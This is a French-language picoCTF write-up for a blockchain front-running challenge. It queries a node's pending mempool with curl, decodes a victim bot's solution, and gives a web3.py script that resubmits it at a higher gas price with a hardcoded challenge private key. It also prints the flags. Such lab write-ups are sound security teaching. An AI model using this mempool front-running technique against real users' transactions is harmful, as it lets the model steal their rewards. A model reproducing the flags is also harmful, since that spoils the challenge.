# Writeup : Front_Running (picoCTF)

## 1. Analyse du Challenge
L'objectif est d'ouvrir un coffre-fort sur la blockchain Ethereum. Un "Victim Bot" connaît la solution mais utilise un prix de gaz très bas. Nous devons intercepter sa solution dans le mempool et la soumettre avec un prix de gaz plus élevé pour gagner la course ("front-running").

### Le Contrat (`FrontRunning.sol`)
Le contrat possède une fonction `solve(string memory solution)` :
```solidity
function solve(string memory solution) public {
    require(!revealed, "Challenge already solved!");
    require(keccak256(abi.encodePacked(solution)) == targetHash, "Incorrect solution!");
    require(msg.sender == studentAddress, "Only the student can claim the flag!");
    revealed = true;
    emit FlagRevealed(flag);
}
```
Seule l'adresse enregistrée (`studentAddress`) peut valider la solution et révéler le flag.

## 2. Extraction de la solution du Mempool
En interrogeant le nœud Ethereum fourni (`candy-mountain.picoctf.net:50975`), nous pouvons lister les transactions en attente :

```bash
curl -H "Content-Type: application/json" -X POST \
--data '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["pending", true],"id":1}' \
http://candy-mountain.picoctf.net:50975
```

Dans les résultats, nous trouvons une transaction vers l'adresse du contrat avec un `input` hexadécimal :
`0x76fe1e92...177069636f4354467b6d336d7030306c5f7031723474337d...`

Le décodage de la partie data révèle la solution : `picoCTF{m3mp00l_p1r4t3}`.

## 3. Exploitation (Front-Running)
Le bot utilise un prix de gaz de **1 Gwei** (`0x3b9aca00`). Pour passer devant lui, nous soumettons la même solution avec **2 Gwei** depuis notre adresse autorisée.

### Script d'Exploitation (`solve.py`)
```python
from web3 import Web3

rpc_url = "http://candy-mountain.picoctf.net:50975"
contract_address = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
player_address = "0xCC787A57a9E3484422426C895b168ba889466e3a"
player_priv = "0xf2efd9c6f840ebbf5d36c15c1caaf7b174f47154f7a2161406721539f4ec83eb"
solution = "picoCTF{m3mp00l_p1r4t3}"

w3 = Web3(Web3.HTTPProvider(rpc_url))
abi = [{"inputs": [{"name": "solution", "type": "string"}],"name": "solve","outputs": [],"stateMutability": "nonpayable","type": "function"}]
contract = w3.eth.contract(address=contract_address, abi=abi)

# Front-run avec 2 Gwei
tx = contract.functions.solve(solution).build_transaction({
    'from': player_address,
    'nonce': w3.eth.get_transaction_count(player_address),
    'gas': 200000,
    'gasPrice': w3.to_wei(2, 'gwei')
})

signed_tx = w3.eth.account.sign_transaction(tx, private_key=player_priv)
w3.eth.send_raw_transaction(signed_tx.raw_transaction)
```

## 4. Résultat
Une fois notre transaction confirmée, le coffre est marqué comme `revealed`. Le flag final est récupéré via l'API `/status` du site web.

**Flag :** `picoCTF{m3mp00l_h31st_bb7e7913}`
